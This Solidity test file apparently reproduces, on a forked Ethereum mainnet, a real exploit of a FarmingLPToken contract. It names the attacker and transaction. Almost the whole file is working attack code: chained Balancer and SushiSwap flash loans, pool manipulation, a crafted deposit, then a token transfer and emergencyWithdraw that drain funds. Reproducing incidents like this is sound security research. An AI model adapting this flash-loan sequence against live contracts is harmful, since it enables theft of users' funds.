// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$3K
// Attacker : https://etherscan.io/address/0x9d44f1a37044500064111010632a8a59003701c8
// Attack Contract : https://etherscan.io/address/0x4bc691601b50b3e107b89d5ea172b40a9dbc6251
// Vulnerable Contract : https://etherscan.io/address/0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x2b6d0af0dc513a15e325703405739057f9de6ef3f99934b957653b8a3fade4c6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1730044259087315046
// Hacking God :

interface ISushi {
    function flashLoan(address borrower, address receiver, address token, uint256 amount, bytes memory data) external;
}

interface IFarmingLPToken {
    function deposit(
        uint256 amountLP,
        address[] memory path0,
        address[] memory path1,
        uint256 amountMin,
        address beneficiary,
        uint256 deadline
    ) external;

    function transfer(address to, uint256 amount) external returns (bool);

    function emergencyWithdraw(address beneficiary) external;

    function withdrawableTotalLPs() external view returns (uint256);

    function totalShares() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
}

interface ISushiUSDC is IUSDC {
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

contract BurntbubbaExploit is BaseTestWithBalanceLog {
    IERC20 private constant AST = IERC20(0x27054b13b1B798B345b591a4d22e6562d47eA75a);
    IERC20 private constant SUSHI = IERC20(0x6B3595068778DD592e39A122f4f5a5cF09C90fE2);
    IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    ISushiUSDC private constant SushiUSDC = ISushiUSDC(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
    IFarmingLPToken private constant FarmingLPToken = IFarmingLPToken(0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E);
    IBalancerVault private constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ISushi private constant SushiSwap = ISushi(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
    Uni_Router_V2 private constant SushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Uni_Pair_V2 private constant AST_SUSHI = Uni_Pair_V2(0xd47f61BFCeA6e64F9D3FEC529C44153E04CB73B9);
    address private constant originalAttackContract = 0x4Bc691601B50B3e107B89d5EA172B40a9dbC6251;

    uint256 private constant blocknumToForkFrom = 18_680_254;
    address private toAddr;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        toAddr = makeAddr("toAddr");
        vm.label(address(AST), "AST");
        vm.label(address(SUSHI), "SUSHI");
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(SushiUSDC), "SushiUSDC");
        vm.label(address(FarmingLPToken), "FarmingLPToken");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(SushiSwap), "SushiSwap");
        vm.label(address(SushiRouter), "SushiRouter");
        vm.label(address(AST_SUSHI), "AST_SUSHI");
    }

    function testExploit() public {
        // Attacking contract start AST amount
        deal(address(AST), address(this), 2_062_557);
        emit log_named_decimal_uint("Exploiter USDC balance before attack", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("Exploiter WETH balance before attack", WETH.balanceOf(address(this)), 18);

        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 800e6;
        amounts[1] = 50e16;
        Balancer.flashLoan(address(this), tokens, amounts, bytes(""));

        emit log_named_decimal_uint("Exploiter USDC balance after attack", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), 18);
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        SushiSwap.flashLoan(address(this), address(this), address(SUSHI), 400_000e18, bytes("_"));
        USDC.transfer(address(Balancer), amounts[0]);
        WETH.transfer(address(Balancer), amounts[1]);
    }

    function onFlashLoan(
        address caller,
        address erc20Token,
        uint256 amount,
        uint256 feeAmount,
        bytes calldata data
    ) external {
        approveAll();
        addLiquidity(address(USDC), address(WETH), 2e6, 1e15);
        addLiquidity(address(USDC), address(AST), 2e6, 10e3);
        addLiquidity(address(SUSHI), address(AST), amount, 10e3);

        address[] memory path0 = new address[](3);
        path0[0] = address(USDC);
        path0[1] = address(AST);
        path0[2] = address(SUSHI);
        address[] memory path1 = new address[](2);
        path1[0] = address(WETH);
        path1[1] = address(SUSHI);
        FarmingLPToken.deposit(
            SushiUSDC.balanceOf(address(this)),
            path0,
            path1,
            0,
            address(this),
            block.timestamp + 1_000
        );
        // Pull out value from original attack contract storage. Needed it for transfer amount calculation
        uint256 value = uint256(vm.load(originalAttackContract, bytes32(uint256(10))));
        uint256 totalWithdrawableLPs = FarmingLPToken.withdrawableTotalLPs();
        uint256 totalShares = FarmingLPToken.totalShares();
        uint256 transferAmount = FarmingLPToken.balanceOf(address(this)) -
            ((value * totalShares) / totalWithdrawableLPs);
        // In the attack tx amount of LPToken was transfered to exploiter eoa addr before making call to
        // 'emergencyWithdraw'
        FarmingLPToken.transfer(toAddr, transferAmount);
        FarmingLPToken.emergencyWithdraw(address(this));
        SushiUSDC.transfer(address(SushiUSDC), SushiUSDC.balanceOf(address(this)));
        SushiUSDC.burn(address(this));
        AST_SUSHI.transfer(address(AST_SUSHI), AST_SUSHI.balanceOf(address(this)));
        AST_SUSHI.burn(address(this));

        uint256 amountOut = feeAmount + (feeAmount / 10);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(SUSHI);
        SushiRouter.swapTokensForExactTokens(amountOut, 200e15, path, address(this), block.timestamp + 1_000);
        SUSHI.transfer(address(SushiSwap), amount + feeAmount);
    }

    function approveAll() private {
        USDC.approve(address(SushiRouter), type(uint256).max);
        WETH.approve(address(SushiRouter), type(uint256).max);
        AST.approve(address(SushiRouter), type(uint256).max);
        SUSHI.approve(address(SushiRouter), type(uint256).max);
        SushiUSDC.approve(address(FarmingLPToken), type(uint256).max);
    }

    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired) private {
        SushiRouter.addLiquidity(
            tokenA,
            tokenB,
            amountADesired,
            amountBDesired,
            0,
            0,
            address(this),
            block.timestamp + 1_000
        );
    }
}
